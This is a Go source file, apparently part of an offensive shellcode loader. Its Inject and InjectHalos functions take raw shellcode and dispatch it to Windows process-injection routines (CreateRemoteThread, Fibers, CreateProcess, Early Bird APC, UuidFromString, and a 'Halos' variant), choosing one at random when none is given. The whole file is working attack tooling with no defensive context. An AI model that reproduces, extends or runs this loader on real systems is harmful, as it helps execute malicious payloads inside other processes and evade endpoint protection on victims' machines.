package core

import (
  "fmt"
  "strings"
)

var techniques = []string{"CreateRemoteThread", "Fibers", "CreateProcess", "EarlyBirdApc", "UuidFromString"}

func Inject(shellcode []byte, technique string) (error) {

  // Check especified injection technique
  if (strings.ToLower(technique) == "createremotethread") {
    err := CreateRemoteThread(shellcode)
    if err != nil { // Handle error
      return err
    }

  } else if (strings.ToLower(technique) == "fibers") {
    err := Fibers(shellcode)
    if err != nil { // Handle error
      return err
    }

  } else if (strings.ToLower(technique) == "createprocess") {
    err := CreateProcess(shellcode)
    if err != nil { // Handle error
      return err
    }

  } else if (strings.ToLower(technique) == "earlybirdapc") {
    err := EarlyBirdApc(shellcode)
    if err != nil { // Handle error
      return err
    }

  } else if (strings.ToLower(technique) == "uuidfromstring"){
    err := UuidFromString(shellcode)
    if err != nil {
      return err
    }

  } else {
    rand_n := RandomInt(4, 0) // Choose a random technique
    fmt.Println("[*] Injecting shellcode using " + techniques[rand_n] + " function")
    err := Inject(shellcode, techniques[rand_n])
    if err != nil { // Handle error
      return err
    }
  }

  return nil
}

func InjectHalos(shellcode []byte, technique string) (error) {
  if (strings.ToLower(technique) == "createprocess") {
    err := CreateProcessHalos(shellcode)
    if err != nil {
      return err
    }

  } else {
    rand_n := RandomInt(4, 0)
    fmt.Println("[*] Injecting shellcode using " + techniques[rand_n] + " function")
    err := InjectHalos(shellcode, techniques[rand_n])
    if err != nil {
      return err
    }
  }

  return nil
}


